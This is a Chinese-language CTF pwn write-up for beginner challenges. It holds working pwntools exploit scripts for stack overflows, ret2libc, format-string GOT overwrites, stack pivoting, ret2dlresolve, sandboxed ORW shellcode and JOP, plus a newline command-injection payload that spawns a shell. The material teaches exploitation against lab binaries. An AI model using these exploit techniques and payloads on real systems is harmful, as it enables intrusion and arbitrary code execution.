# **0 二进制漏洞审计入门指北**

```python
from pwn import *
context(arch='amd64', os='linux', terminal=['wt.exe', 'wsl'])
context.log_level='debug'
# p = process('./pwn')
p = remote('127.0.0.1',30096)
# p = gdb.debug('./pwntools','b bypass')
p.sendline(b'114511')
payload = p32(0xdeadbeef)
payload += b'shuijiangui'
p.sendafter(b'me the password.',payload)
p.interactive()
```

这个题主要是希望大家能在没有了解pwn的情况下，能先去知道怎么和程序交互以及我们在pwn的过程中一个基本的流程是怎么样的，通过逆向题目所给的可执行文件，就能发现这里都需要发送一些什么，然后scanf以及read在读取的时候都有什么区别，基本没有什么难度。

# ez_u64

pwntools的u64可以将小端序bytes转为整形

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./pwn')
def itob(x):
    return str(x).encode()
p.recvuntil('hint.')
code=p.recv(8)
ans=u64(code)
log.debug(ans)
p.sendline(itob(ans))

p.interactive()
```

# find_it

初始fd：0，1，2分配给了stdin,stdout,stderr。新的stdout从3开始分配。open flag后，由于关闭了1，flag会被分配到1。依次输入3,./flag,1即可。

# EZtext

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['wt.exe','wsl'])
p = process('./pwn')
# p = remote('127.0.0.1',35772)
ret = 0x40101a
# p = gdb.debug('./pwn', 'b main')
p.sendline(b'32')
payload = 16 * b'a' + p64(ret) + p64(0x4011B6)
p.send(payload)
p.interactive()
```

很简单的ret2text的一个题，防护开的也不多，比较板子，只需要去控制返回地址执行backdoor即可。

# ezshellcode

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])
p = process('./pwn')
# p = gdb.debug('./pwn', 'b main')
p.sendline(b'4')
p.recvuntil(b'permissions you just set.')
payload = asm(shellcraft.sh())
print('length:',len(payload))
p.send(payload)
p.interactive()

```

同样是一道shellcode的板子，但是此处我添加了一个权限的选择，你需要起码先了解shellcode是一个什么概念，然后去选取此处应该更改为什么权限，之后再通过pwntools库去生成一个对应架构的shellcode发过去，此处新手应该注意，pwntools的shellcraft生成shellcode的时候，是需要你指定context里的架构的，否则会出现问题，shellcode的本质其实就是指令，而不同架构的指令显然不同，所以希望大家注意这一点，另外，shellcode其实也有很多花样，感兴趣的同学可以去pwn college有一个shellcode的模块，比较有意思，里面会对你的shellcode进行各种的限制，包括但不限于开启沙箱限制系统调用，限制长度，限制某些指令的使用，做完这个模块可以对shellcode有一个更好的理解。

# 认识libc

```python
from pwn import *

elf = ELF('./pwn')
libc = ELF('./libc.so.6') 
p = process('./pwn')
# p = remote('', )


p.recvuntil(b"the location of 'printf': ")
leaked_printf_str = p.recvline().strip()
leaked_printf_addr = int(leaked_printf_str, 16)
log.success(f"Leaked printf address: {hex(leaked_printf_addr)}")


libc.address = leaked_printf_addr - libc.symbols['printf']
log.success(f"Calculated libc base address: {hex(libc.address)}")

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
log.success(f"Found system address: {hex(system_addr)}")
log.success(f"Found '/bin/sh' string address: {hex(bin_sh_addr)}")



pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x0000000000029139



offset = 64 + 8 

payload = flat([
    b'A' * offset,
    p64(ret),                
    p64(pop_rdi),            
    p64(bin_sh_addr),        
    p64(system_addr)         
])

p.sendlineafter(b'> ', payload)
log.info("Payload sent!")


p.interactive()
```

一个libc的纯板子，之前的ezlibc还是对于新手有点不友好，所以从这个入门，总体来说，就是当可执行文件本身的指令不足以让你getshell的时候，此时libc就变成了一个百宝箱，里面不仅有system函数，还有很多其他的东西，只要你能泄露出libc的地址并且劫持控制流，就打开了新世界的大门！

# boom(revenge)

time(0)种子在一秒内不变，因此可以以伪随机数方式攻击。远程可能需要微调时间。本题也存在覆盖栈上内容跳过检查的非预期。

```python
from pwn import *
import ctypes
context(os='linux',arch='amd64',log_level='info')
#p=remote('localhost',9000)
p=remote('192.168.211.1', 8106)
#p=process('./pwn')
#gdb.attach(p,'b *0x4013fb')
#pause()
#elf = ELF('./pwn')
lib = ctypes.CDLL('./1.so')
lib.randd.restype = ctypes.c_int
lib.init()
u=lib.randd()
#log.debug(u)
p.sendlineafter(b'(y/n)',b'y')
bkd=0x40127b
payload=b'a'*(0x90-0x14)+p32(u)+b'a'*0x18+p64(bkd)
p.sendlineafter(b'Enter your message: ',payload)
p.interactive()
```

# fmt

栈上放了一个字符串和一个字符串指针，分别%p和%s泄露(可以开个python用p64或者别的转一下)，不用写exp

payload:%10\$p.%7\$s

# inject

本题漏洞与内存损坏无关，但在现实中不算少见。漏洞点是 `ping_host` 中对用户输入 IP 地址的检查有疏漏，没有过滤换行符。用户输入换行符即可分隔命令，从而注入任意 shell 命令。

Exp:

```python
from pwn import *

io = ...

io.sendlineafter(b'choice: ', b'4')
io.sendafter(b'ping: ', b'\nsh #')

io.interactive()
```

# randomlock

可以通过gdb调试或者直接看出来seed是1（考拉兹猜想）。攻击伪随机数。

```python
from pwn import *
import ctypes
context(os='linux',arch='amd64',log_level='debug')
p=process('./pwn')
elf = ELF('./pwn')
lib = ctypes.CDLL('./1.so')
lib.randd.restype = ctypes.c_int
lib.init()
def se(ss):
    p.sendlineafter(b'>',ss)
for i in range(10):
    u=lib.randd()
    se(str(u).encode())
p.interactive()
```

# str_check

手动输入\0可截断strlen绕过检查。strncpy被截断后会补0，因此选择memcpy

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=remote('localhost',9000)
#p=process('./pwn')
#libc = ELF("./libc.so.6")
#elf = ELF('./pwn')
#gdb.attach(p,'b *0x4013ac')
#pause()
bkd=0x40123b
payload=b'meow\x00'.ljust(0x20+8,b'a')+p64(bkd)
p.sendlineafter(b'say?',payload)
p.sendlineafter('?',b'200')
p.interactive()
```

# syslock

负索引修改进入后门，ret2syscall

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=remote('192.168.211.1',11145)
#p=process('./pwn')
#libc = ELF("./libc.so.6")
elf = ELF('./pwn')
#gdb.attach(p)
#pause()
p.sendafter(b'mode\n',b'-32')
payload=p32(0x3b)+b'/bin/sh\x00'
p.sendafter(b'password\n',payload)
rdi_rsi_rdx=0x401240
binsh=0x404084
syscall=0x401230
rax=0x401244
payload=b'a'*(0x40+8)+p64(rdi_rsi_rdx)+p64(binsh)+p64(0)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)
p.sendafter(b'Developer Mode.\n',payload)
p.interactive()
```

# xdulaker

pull函数给了程序基址可得到后门函数真实地址，laker函数存在栈上未初始化字符串，可在photo函数中输入。

```Python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./pwn')
#libc = ELF("./libc.so.6")
elf = ELF('./pwn')
#gdb.attach(p)
#pause()
p.sendlineafter(b'>',b'1')
p.recvuntil(b':')
addr=int(p.recv(14),16)
pie=addr-0x4010
log.debug(hex(pie))
bkd=pie+0x124E

p.sendlineafter(b'>',b'2')
payload=b'a'*0x20+b'xdulaker'
p.sendafter(b'?!',payload)

p.sendlineafter(b'>',b'3')
payload=b'a'*0x38+p64(bkd)
p.sendafter(b'ker',payload)

p.interactive()
```

# easylibc

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['wt.exe','wsl'])
libc = ELF('./libc.so.6')
p = process('./pwn')
# p = gdb.debug('./pwn', 'b main')
# p = remote('127.0.0.1',39137)
p.recvuntil(b'How can I use ')
elf_leak = int(p.recvn(14),16)
elf_base = elf_leak - 0x1060
print('elf base = ',hex(elf_base))
payload = b'a' * 0x20 + p64(elf_base + 0x4500) + p64(elf_base + 0x11EE)


p.send(payload)
p.recvuntil(b'How can I use ')
leak = int(p.recvn(14),16)
print('leak:', hex(leak))
libc_base = leak - 0x1147d0
print('libc_base:', hex(libc_base))
system = libc_base + libc.symbols['system']
print('system:', hex(system))
binsh = libc_base + next(libc.search(b'/bin/sh'))
print('binsh:', hex(binsh))
ret = libc_base + 0x29139
rdi = libc_base + 0x2a3e5

payload = b'a' * 0x20 + p64(elf_base + 0x4500) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
# pwn ./pwn ./libc.so.6
# R
```

这个题，在最开始的时候，我给你打印了read在got中的地址，这个题的初衷是希望大家对于动态链接和延迟绑定能有一个更好的理解，最开始got中read的表项填写的是read函数plt中的一条指令的地址，当第一次调用read之后，完成了地址解析，此时got中的地址就变成了read函数在libc中的真实地址，此时就可以完成libc地址的泄露，很多同学在做的时候，出现的一个坑是，他们知道要重新执行一次这个printf，但是他们返回错地方了，在printf调用之前，有好几条指令都是在完成参数的装载，而他们返回到了装载指令之后，导致参数出现问题，出现了地址泄露不稳定等一系列的问题，希望大家注意这一点。

# ezpivot

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['wt.exe','wsl']
libc = ELF('libc.so.6')
#0x401230 system
#0x404060 bss
#0x401219 rdi
p = process('./pwn')
# p = gdb.debug('./pwn2','b main')
p.sendlineafter(b'of your introduction.',b'-1')
pop_rdi = 0x401219
system = 0x401230
desc = 0x404060
ret = 0x40101a
leave = 0x40120f
payload = b'/bin/sh\x00' + b'\x00'*(0x600-8+0x100)  + p64(0x404600) + p64(0x404600)
payload += p64(pop_rdi) + p64(0x404060) + p64(ret) + p64(system)
p.send(payload)
payload1 = b'a' * 12 + p64(0x404660-8+0x100+0x10) + p64(leave)
p.sendafter(b'lease tell us your phone number:' , payload1)
p.interactive()

```

这个题是一个栈迁移的入门题，希望新手在入门栈迁移的时候，不要用自己大脑模拟，多调试多跟踪，exp一步一步的写，然后去观察rbp以及rsp的变化，此时才能对于迁移的过程更加了然于胸，这里的坑是，首先，当system调用的时候，需要预留好栈空间，如果栈空间不足，当迁移到bss段之后，一些指令会访问或者甚至修改到只读的代码段，引起段错误，我注意到很多锤的同学，他们抬高栈的手段是硬生生输入诸如0x600个a，其实无需这么麻烦，并且太大量的输入会导致打远程的时候，出现io问题，直接玄学报错，你要注意到，read在读取的时候，是用rbp寻址的，因此当你控制了rbp之后，就可以直接任意地址写了，此时直接写到高地址即可，另一个坑的话，就是，当你迁移之后，执行system之前，一定要注意rbp的有效性，很多同学将rsp迁移过来之后，就对rbp不管不顾了，此时rbp相关的指令在访存的时候，会因为rbp是一个无效的值而引起段错误。

# ezprotection

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['wt.exe','wsl'])
#0x11A9 bkd地址
bkd = 0x127d
while True:
    p = process('./pwn')
    # p = gdb.debug('./pwn','b vuln')
    payload = b'a' * 25
    p.send(payload)
    p.recvuntil(b'a'*25)
    canary = b'\x00' + p.recv(7)
    print("canary:", canary)
    payload = b'a' * 24 + canary + b'a' * 8 +p16(bkd)
    p.send(payload)
    # p.interactive()
    # break
    out = p.recvall(1)
    if out.find(b'moectf')!= -1:
        print(out)
        break
    else:
        p.close()
        continue

```

其实这个题并不是很难，主要就是对canary和pie的一个考察，首先是canary的一个特点，第一是，单进程情况下，当程序执行之后，canary就已经确定了，如果你注意一下的话，会发现它是从fs0x28取了一个值作为随机值，有兴趣的同学可以去问问ai这个是什么，其实这里针对此点还可以出成另一个爆破板子，去爆破canary，但希望多考一点东西，就改成了爆破pie，另一个特点就是，canary为了截断一些用来泄露的函数，诸如puts，它的最低一个字节是0x00，因此，如果你能通过栈溢出覆盖掉这个0x00，就可以用输出函数将其泄露出来，之后，要考察的就是pie了，pie在进行随机化的时候，粒度并没有那么细，一页的大小往往是0x1000字节，因此，一个页面内的低12位是不会发生变化的，所以你可以通过多次运行，赌它正好是某个地址，比如这里赌它正好是0x127d，还要注意的一点是，我这里给了一些迷惑性的判断，让你去输入一个随机数passwd进行验证，但是题里压根没有给你一个能泄露这个随机值的地方，但是，你都已经可以跳转到任意地址，干嘛还要验证呢？所以请同学们不要看到backdoor函数，就刻板印象的从最开头开始执行，你都可以瞬移了，难不成还要掏出钥匙手动开锁吗？（bushi。

# fmt_S

my_read函数填满后存在一字节\0溢出，可多次触发格式化字符串。利用栈上长链作为跳板可以修改到talk返回地址。my_read函数调用后rdi为bss上的atk，可输入/bin/sh传参。

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./pwn')
elf = ELF('./pwn')
#gdb.attach(p,'b *0x401337')
#pause()
bkd=0x40127b
def se(ss):
    p.sendafter(b'...',ss)
def pas():
    p.sendafter(b'!',b'\x00'*8)
se(b'%8$p')
p.recvuntil(b'0x')
st=int(b'0x'+p.recv(12),16)-0x18
log.debug(hex(st))
pas()
payload='%{}c%12$hn'.format(st&0xffff).encode()
se(payload)
pas()
payload='%{}c%32$hn'.format(bkd&0xffff).encode()
se(payload)
p.sendlineafter(b'!',b'sh\x00')
p.interactive()
```

# fmt_T

先泄露libc，由于是递归返回所以依次写'sh'，printf_got表地址，以及修改got的payload

```Python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p=process('./pwn')
libc = ELF("./libc.so.6")
elf = ELF('./pwn')
#gdb.attach(p,'b *0x4012de')
#pause()
def sa(pay):
    p.sendafter(b'hell.',pay)
payload=b'%11$p'
p.send(payload)
addr=int(p.recv(14),16)
libc.address=addr-0x29d90
sys_addr=libc.sym['system']
low1 = sys_addr & 0xff
low2 = (sys_addr>>8) & 0xffff 

log.debug(hex(libc.address))
sa(b'sh\x00%')
payload=p64(elf.got['printf'])+p64(elf.got['printf']+1)[:7]
sa(payload)

if low1:
    payload = '%{}c%24$hhn'.format(low1).encode()
else:
    payload = '%24$hhn'.encode()
payload+= '%{}c%25$hn'.format(low2-low1).encode()
payload = payload.ljust(26, b'a')
sa(payload)
p.interactive()
```

# hardpivot

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['wt.exe','wsl'])
#0x000000000002a3e5  pop rdi,ret
#puts got表地址0x403FD0
#gcc -Wl,-z,relro -no-pie -fno-stack-protector -o pwn pwn.c
# p = gdb.debug('./pwn', 'b *vuln+71')
p = process('./pwn')
# p = remote('',)
libc = ELF('./libc.so.6')
bss = 0x4040A0
read_add = 0x401264
pop_rdi = 0x40119e
puts_got = 0x404018
puts_plt = 0x401074
leave_ret = 0x40127b
ret = 0x40101a
new_rbp = 0x4041a0+0x800
new_ret = read_add
payload = b'a' * 0x40 + p64(new_rbp) + p64(new_ret)
p.send(payload)

new_rbp = p64(0x404160+0x800)
new_ret = p64(leave_ret)
payload1 = new_rbp + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_add) + p64(leave_ret)
payload1 = payload1.ljust(0x40, b'a') + new_rbp + new_ret 
p.send(payload1)
p.recvuntil(b'> ')
puts_add = u64(p.recv(6).ljust(8, b'\x00'))
print("puts_add:", hex(puts_add))
libc_base = puts_add - 0x80e50
print("libc_base:", hex(libc_base))
system_add = libc_base + 0x50d70
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()
print("system_add:", hex(system_add))
print("bin_sh:", hex(bin_sh))
new_rbp = p64(0x404120+0x800)
payload2 = new_rbp + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system_add)
payload2 = payload2.ljust(0x40, b'a') + new_rbp + p64(leave_ret)
p.send(payload2)
p.interactive()
```

一个进阶版的栈迁移，其实本质就是，当栈迁移之后，溢出长度不够，不能一次性ROP秒掉的时候，就多迁移一次，每一次都要注意下一次迁移的栈布局，并没有太过于复杂的地方，只是需要细心，耐下心来，一点点的去写exp，一点点的调，不要妄想一次性通过脑洞，直接大脑生成一个三段迁移的exp。

# shellbox

循环中的i可越界写，构造栈溢出

静态链接，用程序中的mprotect改出可执行段

沙箱禁用了execve,open，用openat代替写orw的shellcode

```
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#p=remote('localhost',9000)
p=process('./pwn')
#libc = ELF("./libc.so.6")
elf = ELF('./pwn')
#gdb.attach(p,'b *0x401B57')
#pause()
mprotect=0x443520
pop_rdi=0x401a40
pop_rsi=0x401a42
pop_rdx=0x401a44
buf=0x4ceb60
bss=buf+0x200
shellcode=shellcraft.openat(-100,'./flag\x00')
shellcode+=shellcraft.read(3,bss,0x50)
shellcode+=shellcraft.write(1,bss,0x50)
payload=asm(shellcode)
log.debug(len(payload))
p.sendafter(b'fill it.\n',payload)
payload=b'aaaa'+p32(1)
rop=flat([
    pop_rdi,
    0x4ce000,
    pop_rsi,
    0x1000,
    pop_rdx,
    0x7,
    mprotect,
    buf
])
p.sendafter(b'>',payload)
for i in range(8):
    p.sendafter(b'>',rop[i*8:i*8+8])
p.interactive()
```

# No way to leak

```python
from pwn import *  
context(os='linux',arch='amd64',log_level='debug', terminal=['wt.exe','wsl'])

# r = gdb.debug("./pwn2",'break vuln')
# r = process('./pwn')  
r = remote('127.0.0.1',13820)

elf = ELF('./pwn')  
libc = ELF('./libc-2.31.so')  
read_plt = elf.plt['read']  
setbuf_got = elf.got['setbuf']  
vuln_addr = elf.sym['vuln']  
  
#bss  
bss = 0x404080  
bss_stage = bss + 0x100
l_addr =  libc.sym['system'] -libc.sym['setbuf']  # l_addr = -769472, 通常为负数
  
pop_rdi = 0x000000000040115e  
#pop rsi ; pop r15 ; ret  
pop_rsi = 0x0000000000401160  
#用于解析符号dl_runtime_resolve  
plt_load = 0x401026

def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
    # &(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误
    linkmap = p64(offset & (2 ** 64 - 1))#l_addr

    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容
    linkmap += p64(0) # 可以为任意值
    linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址

    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1)) # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 
    linkmap += p64(0x7) # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
    linkmap += p64(0)# Rela->r_addend,任意值都行

    linkmap += p64(0)#l_ns

    # fake_linkmap_addr + 0x38, DT_SYMTAB 
    linkmap += p64(0) # 参考IDA上.dyamisc的结构
    linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8

    linkmap += b'/bin/sh\x00'
    linkmap = linkmap.ljust(0x68,b'A')
    linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域
    linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
    linkmap = linkmap.ljust(0xf8,b'A')
    linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
    return linkmap

fake_link_map = fake_Linkmap_payload(bss_stage, setbuf_got ,l_addr)# 伪造link_map

payload = flat( 'a' * 120 ,pop_rdi, 0 , pop_rsi , bss_stage ,read_plt ,# 把link_map写到bss段上
                pop_rsi , 0   , # 使栈十六字节对齐，不然调用不了system
                pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 # 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引
)

# r.recvuntil('Welcome to XDCTF2015~!\n')  
r.sendline(payload)  

pause()
r.send(fake_link_map) 

r.interactive() 

```

这个题，我确实没有想到什么好的出法，因为ret2dl这个打法它本身的用途，就是在没有任何手段可以泄露地址的时候，通过ret2dl去getshell，不然的话你是无法获取到libc的地址，因为哪有几个系统不开aslr呢。我这里讲一下我认为的ret2dl的一些局限性：

- 你需要足够的gadget，但是在版本比较新的libc，以及一些题目里，其实不会有那么多类似于pop rdi和pop rsi这种gadget给你用，这里题目最开始想要用的是2.35的libc库，但是因为2.35里fix_up函数发生了一些变动，导致如果大家直接用网上的板子，会打不通，需要去调，调起来对于新手并不友好。2.31里，之所以大家能直接搜到pop rdi，是因为当前版本，csu并没有移动到libc里，而是在主程序里，感兴趣的同学可以去了解一下ret2csu这个打法，以及csu是什么，简单来说就是很多gadget，可以让你很好的进行参数的控制。如果是2.35并且我不给gadget的话，那么你是无法用到csu中的gadget的，因为它们被调整到了libc的内存段中，而libc由于aslr的存在，你并不知道它的基址，题目也无法泄露，所以用不了。如果说你都能泄露libc基址了，我说实话，那干嘛不直接打ret2libc呢？

所以这个题的初衷是希望大家，能认真的跟一下延迟绑定的这个过程，了解一下相关的一些数据结构，尤其是跟一下fix_up这个函数，在今年的dasctf？当时有一个题就是，它的dynstr是可写的（现在正常来说已经变成只读了），所以可以通过修改dynstr，来影响解析过程。所以深度了解一下动态链接和延迟绑定的过程，真的还是很重要的，要在脑子里自己建立起一个动态链接的框架。

远程打不通的同学，有限考虑一下是不是在不同的send发送数据上发生了io玄学问题，试着在send之间添加sleep，来让上一次的传输能传输彻底。

以下提供两个写的很不错的ret2dl的帖子，比较详细，大家可以跟着做一下，切勿好高骛远，直接跳到后面的，从最简单的开始跟着做，对于你的帮助会更大。

https://blog.csdn.net/qq_51868336/article/details/114644569

https://www.cnblogs.com/xshhc/p/17335007.html

另外的话，建议同学们可以自己编译一个带调试信息和源码的动态链接库，并且重新跟踪一下这个过程， 这里有整理出一个编译的过程，希望能帮助到大家。

```bash
wget http://ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gz
然后解压
之后
cd glibc-2.35
mkdir build
之后找一个安装目录，避免覆盖了系统的

../configure --prefix=/home/lhy/libc/debug2.35 --enable-debug CFLAGS="-g -O1" --disable-sunrpc --disable-werror

make CFLAGS="-g -Og" -j$(nproc)
多线程编译

```

之后patch一下就可以直接用了，此时你再去调试的时候会发现可以看到当前执行的是哪一行代码，进行源码级别的调试。

# call_it

本题其实不是一个典型的 JOP 攻击，作为新生赛题，只是想让新生了解：

1. 控制流完整性（CFI）保护这个概念；
2. 代码重用攻击构造链式任意代码执行不只有 ROP 这一种形式，ROP 并非万能。

如果你想要体验更纯正的 JOP，可以尝试 [TGCTF 2025 - noret](https://ctf.xidian.edu.cn/training/19?challenge=766)。

---

其实 JOP 更像是对 ROP 的概念扩充而不是一个新的攻击方式，让我们先来回顾下熟悉的 amd64 ROP。（以下只是我个人极不严谨的理解，可能和学术界普遍的描述有较大偏差，仅供参考。）在 ROP 中，我们大概可以将 gadgets 分为三类：

* 传递参数或做准备的 gadgets（例如 `pop rdi`）、收集函数返回值的 gadgets（例如 `mov rdi, rax`）
* 执行有意义操作的 gadgets（例如 `system`、`orw`、`syscall`、`shellcode`）。
* 控制 ROP 本身的 gadgets（例如 `ret`、`leave` 栈迁移）

以上 gadgets 通过 `ret` 指令和 `rsp` 寄存器串联起来。

为了引出 JOP，我想到了一个好方法，一个“分解”x86 中较复杂指令的游戏：

（下文 `reg` 表示任意通用寄存器。）我们来“分解”`pop reg` 指令，它“等效”于 `mov reg, qword ptr [rsp]; add rsp, 8`。（我们忽略了对标志位的影响，如果考虑的话第二个指令应为 `lea rsp, [rsp + 8]`。）JOP 链的位置完全可以不在栈上，最终我们可以提取出：

```assembly
mov reg1, qword ptr [reg2 + offset]
或
mov qword ptr [reg2 + offset], reg1
```

（由于有 `+ offset`，我们不需要 `add`，下同。）这就是 JOP 中类似 ROP 的“传参准备”或“收集结果”gadgets。（例如考虑 `reg1` 是 `rdi` 的情况。）

但是可以看到这并不能构造链式执行。现在我们来“分解”`ret` 指令，它“等效”于 `pop tmp; jmp tmp`，由上文进而“展开”为 `mov tmp, qword ptr [rsp]; add rsp, 8; jmp tmp`，现在我们又提取出了：

```assembly
mov reg1, qword ptr [reg2 + offset]
jmp reg1 或 call reg1 或 ...（跳转）
```

我们只需预先在 `reg2 + offset` 位置布置好下一个 JOP gadget，这就是 JOP 中类似 ROP 的“控制”gadgets。

把上述两部分拼起来，我们最终获得了和 ROP 相同的能力。它与栈无关，与函数返回无关。这就是 JOP。希望大家能通过本文从 ROP 流畅过渡到更广义的 JOP 概念。

---

来看点具体的吧，本题的 JOP gadgets 就是：

```assembly
00401235  mov     rax, rdi
00401238  mov     rdi, qword [rax+0x8]
0040123c  call    qword [rax+0x10]
```

当然还有：

```assembly
00401228  call    qword [rel system]
```

可以看到就是上述简单情况的排列组合。

另外我们还需要注意到 `program` 在遇到“Invalid choice”时依旧会增加 index，因此可以越界写篡改 MoeBot 动作函数地址。

Exp:

```python
from pwn import *

context(arch='amd64', os='linux')
io = ...

for _ in range(8):
    io.sendlineafter(b'gesture: ', b'6')

io.sendlineafter(b'gesture: ', b'1')
io.sendafter(b'gesture? ', p64(0x401235) + p64(0x4040f8)[0:7])
io.sendlineafter(b'gesture: ', b'1')
io.sendlineafter(b'gesture? ', p64(0x401228) + b'/bin/sh')
io.sendlineafter(b'gesture: ', b'0')

io.interactive()
```